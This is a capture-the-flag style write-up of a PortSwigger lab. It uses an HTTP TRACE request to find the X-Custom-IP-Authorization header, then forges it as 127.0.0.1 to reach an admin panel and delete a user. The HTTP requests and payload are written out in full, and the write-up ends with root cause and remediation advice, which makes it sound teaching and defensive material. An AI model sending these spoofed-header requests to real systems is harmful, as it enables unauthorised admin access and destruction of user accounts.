## Metadata

* **Difficulty:** Practitioner
* **Category:** Information disclosure
* **Lab URL:** [Lab: Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)
* **Date Solved:** 22/09/2026
## Vulnerability Summary

The app is vulnerable to an authentication bypass caused by information disclosure via the HTTP `TRACE` method. An intermediate reverse proxy appends a custom header, `X-Custom-IP-Authorization`, containing the client's IP address to incoming requests. By issuing an HTTP `TRACE` request, an attacker can read the diagnostic reflection of the rewritten request, discover this internal header, and forge it with a loopback address (`127.0.0.1`) to bypass IP-based access controls protecting the `/admin` interface and perform administrative actions.
## Reconnaissance

* Attempting to access the administrative panel via `GET /admin` results in a `401 Unauthorized` response with the message:

```http
HTTP/2 401 Unauthorized
...
"Admin interface only available to local users"
```

* Testing supported HTTP methods against the endpoint by sending a `TRACE` request reveals that the server allows the `TRACE` method. The response reflects the incoming request as received by the backend server, including headers injected by reverse proxies or load balancers:
```http
HTTP/2 200 OK
Content-Type: message/http
...

TRACE /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
...
X-Custom-IP-Authorization: [your-ip-address]
```
The reflected request exposes the internal header `X-Custom-IP-Authorization`. The backend might rely on this header to evaluate the client's origin rather than enforcing trust boundaries at the network layer.
## Exploitation Steps

1. Send an HTTP `TRACE` request to `/admin` using Burp Repeater to inspect proxy header rewrites and observe the reflected `X-Custom-IP-Authorization` header.
2. Send a `GET /admin` request with the forged header `X-Custom-IP-Authorization: 127.0.0.1`:

```http
GET /admin HTTP/2
Host: [lab-id].web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
...
```
3. Observe a `200 OK` response returning the admin panel interface, which exposes the user management actions:
```html
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
```
4. Issue a request to delete the user `carlos` while retaining the spoofed loopback header:
```http
GET /admin/delete?username=carlos HTTP/2
Host: [lab-id].web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
...
```
5. Observe the `302 Found` response redirecting to `/admin`. Follow the redirect. Observe that the response reads "User deleted successfully!" and lab is solved.
## Payload Used

```http
X-Custom-IP-Authorization: 127.0.0.1
```

HTTP `TRACE` is a diagnostic method designed for loopback testing along the request-response path. When proxies forward requests, they often append or modify headers (such as client IP tracking headers) before passing the traffic to origin servers. Because the reverse proxy in this architecture fails to strip client-supplied `X-Custom-IP-Authorization` headers, setting this value to `127.0.0.1` overwrites or presets the client identity. The backend app's access control check parses this header, assumes the request originated locally from the loopback interface, and grants administrative privileges.
## Root Cause

* The web server and intermediate reverse proxies permit the HTTP `TRACE` method, facilitating Cross-Site Tracing (XST) and diagnostic information disclosure of internal routing headers.
* The front-end proxy does not strip or sanitize untrusted `X-Custom-IP-Authorization` request headers arriving from external clients.
* The backend application blindly trusts client-controllable HTTP headers for authorization decisions.
## Remediation

* Disable the HTTP `TRACE` method globally across all web servers and reverse proxies:
```
TraceEnable Off
```
* Configure the front-end reverse proxy to strip all incoming `X-Custom-IP-Authorization` headers from external clients before adding its own trusted upstream header.
* Avoid using custom IP headers for handling access control. Sensitive endpoints should be protected by secure authentication schemes (e.g., session cookies, MFA) or isolated via internal management subnets and VPNs.